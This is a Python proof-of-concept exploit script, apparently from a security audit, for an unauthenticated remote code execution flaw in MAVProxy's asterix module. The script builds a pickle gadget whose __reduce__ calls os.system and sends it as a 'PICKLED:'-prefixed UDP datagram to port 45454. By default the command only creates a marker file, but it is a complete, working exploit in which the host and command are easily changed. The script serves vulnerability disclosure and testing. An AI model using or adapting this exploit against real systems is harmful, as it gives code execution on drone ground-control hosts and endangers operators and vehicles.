#!/usr/bin/env python3
"""
poc_G06_mavproxy_asterix_pickle_rce.py
================================================================================
Finding ID : G06
Target GCS : MAVProxy  (mavproxy_asterix module, when loaded)
Severity   : CRITICAL (unauthenticated remote code execution via pickle)
Class      : CWE-502 (Deserialization of Untrusted Data)

WHAT THIS DEMONSTRATES
----------------------
This finding is STANDALONE — it does NOT use the MAVLink fake-vehicle harness.
When the operator loads MAVProxy's `asterix` module, it opens a UDP socket on port
45454 and, for any datagram prefixed `PICKLED:`, calls pickle.loads() on the rest:

    MAVProxy/modules/mavproxy_asterix.py:63
        self.asterix_settings = mp_settings.MPSettings([("port", int, 45454), ...
    MAVProxy/modules/mavproxy_asterix.py:198-210
        pkt = self.sock.recv(10240)
        ...
        if pkt.startswith(b'PICKLED:'):
            pkt = pkt[8:]
            amsg = [pickle.loads(pkt)]          # <-- arbitrary deserialization

pickle.loads on attacker bytes is arbitrary code execution: a crafted object's
__reduce__ runs on unpickle. ANY host that can send a UDP packet to 127.0.0.1:45454
(local malware, a companion computer, a compromised LAN peer, or a vehicle bridged
to this port) gets code execution in the MAVProxy process.

This PoC sends a BENIGN pickle whose __reduce__ writes a marker file
(/tmp/asterix_pwned) and prints — NOT a real payload. It proves the sink fires
without doing anything harmful.

WHAT TO OBSERVE
---------------
1. Start MAVProxy and load the module:   module load asterix
   (optionally `asterix set port 45454` — that is the default).
2. Run this PoC:   python3 poc_G06_mavproxy_asterix_pickle_rce.py
3. Observe in the MAVProxy process:
   - the file /tmp/asterix_pwned appears (our benign __reduce__ executed), and/or
   - a line printed by the unpickled object.
   That marker is proof of code execution inside MAVProxy from a single UDP packet.

SAFETY / AUTHORIZATION
----------------------
Authorized localhost/bench only. The payload is BENIGN by construction: its
__reduce__ ONLY runs `os.system` to `touch` a marker file (or `print` if you pass
--no-touch). It performs no deletion, no network, no privileged action. Review the
_BenignMarker class below before running.
"""
import argparse
import os
import pickle
import socket
import sys


class _BenignMarker:
    """A deliberately BENIGN pickle gadget.

    On unpickle, pickle calls __reduce__, which here returns (os.system, (cmd,))
    where `cmd` only creates a marker file. This is the SAME mechanism a real
    attacker would abuse — but the command is harmless and fully visible.
    """
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        # Equivalent to: os.system("<cmd>") at unpickle time.
        return (os.system, (self.cmd,))


def main():
    p = argparse.ArgumentParser(description="G06 MAVProxy asterix pickle RCE (benign)")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=45454,
                   help="mavproxy_asterix UDP port (default 45454)")
    p.add_argument("--marker", default="/tmp/asterix_pwned",
                   help="benign marker file the payload creates (default /tmp/asterix_pwned)")
    p.add_argument("--no-touch", action="store_true",
                   help="use a harmless print instead of creating a marker file")
    a = p.parse_args()

    print("=" * 66)
    print("  G06: MAVProxy asterix module PICKLED: UDP -> pickle.loads RCE")
    print("=" * 66)
    print("[!]  BENIGN PoC. Authorized localhost/bench MAVProxy only.")

    if a.no_touch:
        # POSIX/Windows-portable harmless command: echo a marker line.
        benign_cmd = "echo asterix_pickle_poc_reached_code_execution"
    else:
        # `touch`-style marker; harmless. On Windows use `type nul > file`.
        if os.name == "nt":
            benign_cmd = 'type nul > "%s"' % a.marker
        else:
            benign_cmd = "touch '%s'" % a.marker

    print("[obs] benign __reduce__ command: %r" % benign_cmd)
    print("[obs] sink: mavproxy_asterix.py:206 pickle.loads(pkt[8:]) after 'PICKLED:' prefix")

    payload = b"PICKLED:" + pickle.dumps(_BenignMarker(benign_cmd))
    print("[obs] datagram = b'PICKLED:' + pickle.dumps(<benign marker gadget>)  (%d bytes)"
          % len(payload))

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.sendto(payload, (a.host, a.port))
    except Exception as e:  # noqa: BLE001
        print("[!]  send failed: %s" % e)
        sys.exit(2)
    finally:
        s.close()

    print("[atk] sent benign PICKLED: datagram to %s:%d" % (a.host, a.port))
    if not a.no_touch:
        print("[ok] If asterix is loaded, observe %r created inside the MAVProxy host."
              % a.marker)
    else:
        print("[ok] If asterix is loaded, observe the marker line printed by MAVProxy.")


if __name__ == "__main__":
    main()
